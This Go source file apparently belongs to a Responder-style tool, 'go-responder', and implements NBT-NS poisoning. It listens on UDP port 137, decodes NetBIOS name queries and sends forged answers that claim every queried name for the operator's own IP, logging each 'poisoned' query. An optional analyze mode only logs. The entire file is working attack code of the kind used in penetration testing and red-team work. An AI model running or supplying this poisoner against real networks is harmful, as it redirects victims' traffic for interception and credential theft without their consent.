package poisoner

import (
	"encoding/binary"
	"fmt"
	"net"
	"strings"

	"go-responder/internal/core"
)

const nbtnsPort = 137

func PoisonNBTNS(ifaceIP net.IP) {
	conn, err := net.ListenPacket("udp4", fmt.Sprintf("0.0.0.0:%d", nbtnsPort))
	if err != nil {
		core.LogError("NBT-NS listen :%d — %v (need root?)", nbtnsPort, err)
		return
	}
	defer conn.Close()
	core.LogInfo("NBT-NS listening on %s (UDP %d)", ifaceIP, nbtnsPort)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFrom(buf)
		if err != nil {
			continue
		}
		pkt := buf[:n]
		name := ParseNBTNSQuery(pkt)
		if name == "" {
			continue
		}
		core.LogVerbose("NBT-NS query: '%s' from %s", name, src)
		if core.AnalyzeMode {
			core.LogInfo("[NBT-NS] [Analyze] query for '%s' from %s", name, src)
			continue
		}
		if !core.ShouldRespond(src, name) {
			continue
		}
		resp := BuildNBTNSResponse(pkt, ifaceIP)
		if resp != nil {
			conn.WriteTo(resp, src)
			core.LogInfo("[NBT-NS] Poisoned query for '%s' — responding with %s", name, ifaceIP)
		}
	}
}

func ParseNBTNSQuery(pkt []byte) string {
	if len(pkt) < 12 {
		return ""
	}
	flags := binary.BigEndian.Uint16(pkt[2:4])
	if flags&0x8000 != 0 {
		return ""
	}
	if binary.BigEndian.Uint16(pkt[4:6]) == 0 {
		return ""
	}
	if len(pkt) < 13 {
		return ""
	}
	labelLen := int(pkt[12])
	if labelLen != 32 || len(pkt) < 12+1+32 {
		return ""
	}
	return DecodeNBTName(pkt[13 : 13+32])
}

func DecodeNBTName(encoded []byte) string {
	if len(encoded) != 32 {
		return ""
	}
	var b strings.Builder
	for i := 0; i < 32; i += 2 {
		hi := encoded[i] - 'A'
		lo := encoded[i+1] - 'A'
		c := (hi << 4) | lo
		if c != 0x20 && c != 0x00 {
			b.WriteByte(c)
		}
	}
	return strings.TrimSpace(b.String())
}

func EncodeNBTName(name string, suffix byte) []byte {
	padded := make([]byte, 16)
	copy(padded, []byte(strings.ToUpper(name)))
	for i := len(name); i < 15; i++ {
		padded[i] = 0x20
	}
	padded[15] = suffix
	out := make([]byte, 32)
	for i, c := range padded {
		out[i*2] = 'A' + (c >> 4)
		out[i*2+1] = 'A' + (c & 0x0F)
	}
	return out
}

func BuildNBTNSResponse(query []byte, ip net.IP) []byte {
	if len(query) < 12 {
		return nil
	}
	txID := binary.BigEndian.Uint16(query[0:2])
	if len(query) < 13 {
		return nil
	}
	labelLen := int(query[12])
	if labelLen != 32 || len(query) < 13+32+4 {
		return nil
	}
	encodedName := query[12 : 13+32+1]

	var resp []byte
	resp = append(resp, byte(txID>>8), byte(txID))
	resp = append(resp, 0x85, 0x00)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, encodedName...)
	resp = append(resp, 0x00)
	resp = append(resp, 0x00, 0x20)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x00, 0x00, 0x1E)
	resp = append(resp, 0x00, 0x06)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, ip.To4()...)
	return resp
}
